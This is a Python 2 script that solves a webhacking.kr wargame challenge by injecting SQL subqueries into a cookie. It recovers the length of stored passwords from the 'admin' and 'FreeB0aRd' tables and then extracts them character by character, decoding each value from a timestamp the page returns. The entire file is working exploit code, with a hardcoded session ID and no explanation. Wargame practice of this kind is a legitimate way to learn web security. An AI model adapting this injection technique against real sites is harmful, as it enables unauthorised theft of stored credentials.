import urllib
import httplib
import time
import datetime

def main(Table):
    HTTP=httplib.HTTPConnection("webhacking.kr")
    Url="/challenge/web/web-02/"
    Session="4841ee834d02a659d2db1d88912fab71";
    Passwd=""
    MinusTime=datetime.datetime(2070,1,1,9,0,0)

    # get length of password
    Payload="(select length(Password) from %s)" % Table
    Headers={"Cookie":"PHPSESSID=%s; time=%s;" % (Session,Payload)}
    HTTP.request("GET",Url,"",Headers)
    Result=HTTP.getresponse().read()
    t=Result[Result.find("<!--")+len("<!--"):Result.find("-->")]
    t=datetime.datetime.strptime(t,"%Y-%m-%d %H:%M:%S")
    Passwd_len=int(time.mktime(t.timetuple())-time.mktime(MinusTime.timetuple()))
    print "[*] Length : %d" % Passwd_len

    # get password
    for i in range(1,Passwd_len+1):
        Payload="(select ascii(mid(Password,%d,1)) from %s)" % (i,Table)
        Headers={"Cookie":"PHPSESSID=%s; time=%s;" % (Session,Payload)}
        HTTP.request("GET",Url,"",Headers)
        Result=HTTP.getresponse().read()
        t=Result[Result.find("<!--")+len("<!--"):Result.find("-->")]
        t=datetime.datetime.strptime(t,"%Y-%m-%d %H:%M:%S")
        c=chr(int(time.mktime(t.timetuple())-time.mktime(MinusTime.timetuple())))
        Passwd+=c
        print "[+] Found : %c" % c

    print "[*] Password : %s" % Passwd
    return True

if __name__ == "__main__":
    main("admin")
    main("FreeB0aRd")
